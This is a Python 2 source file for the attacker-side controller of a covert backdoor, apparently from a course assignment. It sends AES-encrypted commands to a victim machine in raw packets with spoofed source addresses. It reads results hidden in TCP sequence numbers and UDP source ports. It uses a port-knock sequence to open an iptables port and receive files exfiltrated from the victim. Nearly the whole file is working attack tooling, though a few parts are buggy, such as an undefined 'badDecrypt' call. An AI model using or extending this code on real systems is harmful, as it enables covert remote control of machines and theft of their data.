
#server / attacker
import ConfigParser, threading, hashlib, sys, os, socket, subprocess
import pcapy #sudo apt-get install python-pcapy


#from Crypto import Random
from Crypto.Cipher import AES
from struct import pack, unpack

configParser = ConfigParser.RawConfigParser()
configFilePath = r'config.txt'
configParser.read(configFilePath)

dstIP = configParser.get('config', 'dstIP')
srcIP = configParser.get('config', 'srcIP')
dstPort = configParser.get('config', 'dstPort')
fileDir = configParser.get('config', 'fileDir')
key = configParser.get('config', 'password')
print dstIP
fileMessage = []
portKnock = [0,0]
doorOpen = 0

#----------------------------------------------------------------------
#-- FUNCTION: checkRoot()
#--
#-- NOTE:
#-- Check the uid running the application. If its not root, then exit.
#----------------------------------------------------------------------
def checkRoot():
    if(os.getegid() != 0):
        sys.exit("The program must be run with root")



#Using encryption code from backdoor assignment

IV = 16 * '\x00'#16 is block size

#convert the password to a 32-byte key using the SHA-256 algorithm
def getKey():
    global key
    return hashlib.sha256(key).digest()


# decrypt using the CFB mode (cipher feedback)
def decrypt(text):
    global IV
    key = getKey()
    decipher = AES.new(key, AES.MODE_CFB, IV)
    plaintext = decipher.decrypt(text)
    return plaintext

#encrypt using the CFB mode (cipher feedback)
def encrypt(text):
    key = getKey()
    global IV
    cipher = AES.new(key, AES.MODE_CFB, IV)
    ciphertext = cipher.encrypt(text)
    return ciphertext


# checksum functions needed for calculation checksum
def checksum(msg):
    s = 0

    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        w = ord(msg[i]) + (ord(msg[i + 1]) << 8)
        s = s + w

    s = (s >> 16) + (s & 0xffff);
    s = s + (s >> 16);

    # complement and mask to 4 byte short
    s = ~s & 0xffff

    return s

def string_bin(string):
    return ''.join(format(ord(c), 'b') for c in string)


#listening for packets
def getFile():
    cap = pcapy.open_live("eno1", 65536, 1, 0)
    while (1):
        (header, packet) = cap.next()
        victimFile = parse_file_packet(packet)






#----------------------------------------------------------------------
#-- FUNCTION: checkKnock()
#--
#-- NOTE:
#-- Checking for a port knock:
#-- If we received the correct sequence of packets, we will open a port
#-- and begin to receive the file from the victim machine
#-- 
#-- We are checking for the correct ipid and encrypted message
#----------------------------------------------------------------------
def checkKnock(packet):
    global portKnock
    global doorOpen
    eth_length = 14
    eth_header = packet[:eth_length]
    eth = unpack('!6s6sH', eth_header)
    eth_protocol = socket.ntohs(eth[2])

    # Parse IP packets, IP Protocol number = 8
    if eth_protocol == 8:
        ip_header = packet[eth_length:20 + eth_length]
        iph = unpack('!BBHHHBBH4s4s', ip_header)
        version_ihl = iph[0]
        version = version_ihl >> 4
        ihl = version_ihl & 0xF
        iph_length = ihl * 4
        ttl = iph[5]
        ipid = iph[3]

        #First knock 
        if (ipid ==4567):
            protocol = iph[6]
            s_addr = socket.inet_ntoa(iph[8]);
            d_addr = socket.inet_ntoa(iph[9]);
            if protocol == 17:
                udph_length = 8
                h_size = eth_length + iph_length + udph_length
                password = packet[h_size:]
                if decrypt(password.rstrip('\x00')) == "KNOCK1":
                    portKnock[0] = 1
                    print "KNOCK1"

        #Second knock
        elif (ipid == 5678):
            protocol = iph[6]
            s_addr = socket.inet_ntoa(iph[8]);
            d_addr = socket.inet_ntoa(iph[9]);
            if protocol == 17:
                udph_length = 8
                h_size = eth_length + iph_length + udph_length
                password = packet[h_size:]
                if decrypt(password.rstrip('\x00')) == "KNOCK2":
                    if portKnock[0] ==1:
                        portKnock[1] =1
                        print "KNOCK2"




#handle file from victim
def receiveFile(packet):
    global fileMessage
    eth_length = 14
    eth_header = packet[:eth_length]
    eth = unpack('!6s6sH', eth_header)
    eth_protocol = socket.ntohs(eth[2])

    #open firewall port
    rule = "iptables -A INPUT -p tcp --dport 8505 -j ACCEPT"
    process = subprocess.Popen(rule, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # Parse IP packets, IP Protocol number = 8

    if eth_protocol == 8:
        ip_header = packet[eth_length:20 + eth_length]
        iph = unpack('!BBHHHBBH4s4s', ip_header)
        version_ihl = iph[0]
        version = version_ihl >> 4
        ihl = version_ihl & 0xF
        iph_length = ihl * 4
        ttl = iph[5]
        ipid = iph[3]


        #handle the file contents 
        if (ipid == 123):
            protocol = iph[6]
            s_addr = socket.inet_ntoa(iph[8]);
            d_addr = socket.inet_ntoa(iph[9]);
            # UDP packets
            if protocol == 17:
                udph_length = 8
                h_size = eth_length + iph_length + udph_length
                password = packet[h_size:]
                u = iph_length + eth_length
                udp_header = packet[u:u + 8]
                # now unpack them :)
                udph = unpack('!HHHH', udp_header)
                source_port = udph[0]#byte stored here
                fileMessage.append(source_port)


        #handle conclusion of file transfer
        elif (ipid ==1234):
            protocol = iph[6]
            s_addr = socket.inet_ntoa(iph[8]);
            d_addr = socket.inet_ntoa(iph[9]);
            if protocol == 17:
                udph_length = 8
                h_size = eth_length + iph_length + udph_length
                password = packet[h_size:]
                u = iph_length + eth_length
                udp_header = packet[u:u + 8]
                udph = unpack('!HHHH', udp_header)
                fileName = packet[h_size:]

                fileName = decrypt(fileName.rstrip('\x00'))
                print "\n File " + str(fileName) + " has been modified"

                fileString = ""
                for m in fileMessage:
                    fileString += chr(m)

                newFile = open (fileName, 'w')
                newFile.write(decrypt(fileString))
                newFile.close()
                fileString=""
                fileMessage = []

                #reset port knock flags
                portKnock [0] = 0
                portKnock [1] = 0
                doorOpen = 0
                #flush iptables
                rule = "iptables -F"
                process = subprocess.Popen(rule, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


#begin receiving file if both portKock packets received
def parse_file_packet(packet):
    global fileMessage
    global portKnock
    global doorOpen
    if (portKnock[0]==1 and portKnock[1]==1):
        doorOpen ==1
        receiveFile(packet)

    if doorOpen == 0:
        checkKnock(packet)



#handling user cmd line arguements
def getCmd():
    protocol = ""
    while True:
        #get protocol from user

        while protocol == "":
            protocol = raw_input("Enter protocol to use: TCP or UDP ")
            if (protocol != "TCP" and protocol != "UDP"):
                break
        cmd = raw_input("Enter a command: ")
        if cmd =="exit":
            print "Exiting"
            sys.exit()
        elif cmd =="close":
            #drop iptables rule
            print "Closing port"
        else :
            encryptedCmd=encrypt(cmd)
            print "Command: " + cmd
            print "Encrypted command: "+ encryptedCmd
            print "Decypted command with wrong password: "+badDecrypt(encryptedCmd)
            print "Decrypted command with correct password: "+decrypt(encryptedCmd)

            #encrypt the command
            '''
            password = encrypt("pass")
            #convert password to binary
            password = string_bin(password)
            '''
            #signature = encrypt(key)
            #create a packet to send to the victim
            sendCommand(protocol, encryptedCmd, 1000)
            sniffer()



#send command for victim machine to execute
def sendCommand(protocol, data, password):
    # http://www.binarytides.com/raw-socket-programming-in-python-linux/

    # create a raw socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error, msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    # ip header fields
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0  # kernel will fill the correct total length
    ip_id = 54321  # Id of this packet
    ip_frag_off = 0
    ip_ttl = 144
    if (protocol == "TCP"):
        ip_proto = socket.IPPROTO_TCP
    if (protocol == "UDP"):
        ip_proto = socket.IPPROTO_UDP
    ip_check = 0  # kernel will fill the correct checksum
    ip_saddr = socket.inet_aton(srcIP)  # Spoof the source ip address if you want to
    ip_daddr = socket.inet_aton(dstIP)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    # the ! in the pack format string means network order
    ip_header = pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto,
                     ip_check, ip_saddr, ip_daddr)


    if(protocol == "TCP"):
        print "create TCP header"
        # tcp header fields
        tcp_source = 1234  # source port
        tcp_dest = 80  # destination port
        #put password to seq
        tcp_seq = password
        tcp_ack_seq = 0
        tcp_doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
        # tcp flags
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        #tcp_window = socket.htons(5840)  # maximum allowed window size
        tcp_window = len(data)
        tcp_check = 0
        tcp_urg_ptr = 0

        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)

        # the ! in the pack format string means network order
        tcp_header = pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        # pseudo header fields
        source_address = socket.inet_aton(srcIP)
        dest_address = socket.inet_aton(dstIP)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header) + len(data)
        psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length);
        psh = psh + tcp_header + data;
        #tcp_check = checksum(psh)
        tcp_check = 10
        # print tcp_checksum
        # make the tcp header again and fill the correct checksum - remember checksum is NOT in network byte order
        tcp_header = pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window) + pack('H', tcp_check) + pack('!H', tcp_urg_ptr)
        #final full packet - syn packets dont have any data
        packet = ip_header + tcp_header + data
        print "TEST", len(ip_header), len(tcp_header), len(data), len(packet)




    if (protocol == "UDP"):
        print "create UDP header"
        data = data
        sport = password
        dport = 8505
        length = 8+len(data)
        checksum = len(data)
        udp_header = pack('!HHHH', sport, dport, length, checksum)
        packet = ip_header + udp_header + data

    # Send the packet finally - the port specified has no effect
    s.sendto(packet, (dstIP, 0))  # put this in a loop if you want to flood the target




def sniffer():
    # list all devices
    devices = pcapy.findalldevs()
    print devices

    '''
    # ask user to enter device name to sniff
    print "Available devices are :"
    for d in devices:
        print d
    '''
    '''
    dev = raw_input("Enter device name to sniff : ")

    print "Sniffing device " + dev
    '''
    '''
    open device
    # Arguments here are:
    #   device
    #   snaplen (maximum number of bytes to capture _per_packet_)
    #   promiscious mode (1 for true)
    #   timeout (in milliseconds)
    '''
    cap = pcapy.open_live("eno1", 65536, 1, 0)

    # start sniffing packets
    while (1):
        (header, packet) = cap.next()
         #print ('%s: captured %d bytes, truncated to %d bytes' %(datetime.datetime.now(), header.getlen(), header.getcaplen()))
        command = parse_packet(packet)
        if(command == True):
            break

# function to parse a packet
def parse_packet(packet):
    # parse ethernet header
    eth_length = 14

    eth_header = packet[:eth_length]
    eth = unpack('!6s6sH', eth_header)
    eth_protocol = socket.ntohs(eth[2])
    '''
    print 'Destination MAC : ' + eth_addr(packet[0:6]) + ' Source MAC : ' + eth_addr(
        packet[6:12]) + ' Protocol : ' + str(eth_protocol)
    '''

    # Parse IP packets, IP Protocol number = 8
    if eth_protocol == 8:
        # Parse IP header
        # take first 20 characters for the ip header
        ip_header = packet[eth_length:20 + eth_length]

        # now unpack them :)
        iph = unpack('!BBHHHBBH4s4s', ip_header)

        version_ihl = iph[0]
        version = version_ihl >> 4
        ihl = version_ihl & 0xF

        iph_length = ihl * 4

        ttl = iph[5]

        # check if ttl is 144
        if (ttl == 144):
            protocol = iph[6]
            s_addr = socket.inet_ntoa(iph[8]);
            d_addr = socket.inet_ntoa(iph[9]);
            '''
            print 'Version : ' + str(version) + ' IP Header Length : ' + str(ihl) + ' TTL : ' + str(
                ttl) + ' Protocol : ' + str(protocol) + ' Source Address : ' + str(
                s_addr) + ' Destination Address : ' + str(d_addr)
            '''
            # TCP protocol
            if protocol == 6:
                t = iph_length + eth_length
                tcp_header = packet[t:t + 20]

                # now unpack them :)
                tcph = unpack('!HHLLBBHHH', tcp_header)

                # check if payload is our password
                # get password from the packet
                doff_reserved = tcph[4]
                tcph_length = doff_reserved >> 4
                h_size = eth_length + iph_length + tcph_length * 4
                data_size = len(packet) - h_size
                password = packet[h_size:len(packet)-2]
                if(decrypt(password) == "1000"):
                    source_port = tcph[0]
                    dest_port = tcph[1]
                    sequence = tcph[2]
                    acknowledgement = tcph[3]
                    '''
                    print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(
                        dest_port) + ' Sequence Number : ' + str(
                        sequence) + ' Acknowledgement : ' + str(acknowledgement) + ' TCP header length : ' + str(
                        tcph_length)
                    '''

                    result = chr(sequence)





                    #print 'Data : ' + result
                    sys.stdout.write(result)
                    #print result,
                    if (iph[3] == 2):
                        return True

            # UDP packets
            elif protocol == 17:
                udph_length = 8
                h_size = eth_length + iph_length + udph_length
                password = packet[h_size:len(packet)-14]
                #print "test"
                if(decrypt(password) == "1000"):
                    u = iph_length + eth_length

                    udp_header = packet[u:u + 8]

                    # now unpack them :)
                    udph = unpack('!HHHH', udp_header)

                    source_port = udph[0]
                    dest_port = udph[1]
                    length = udph[2]
                    checksum = udph[3]
                    '''
                    print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(
                        length) + ' Checksum : ' + str(checksum)
                    '''

                    data_size = len(packet) - h_size


                    # get data from the packet
                    result = source_port
                    result = chr(source_port)

                    #print result,
                    sys.stdout.write(result)
                    if (iph[3] == 2):
                        return True



#2 main threads. User commands & file extraction
def main():
    checkRoot()

    cmdThread = threading.Thread(target=getCmd)
    fileThread = threading.Thread(target=getFile)

    cmdThread.start()
    fileThread.start()

if __name__== '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print "exiting.."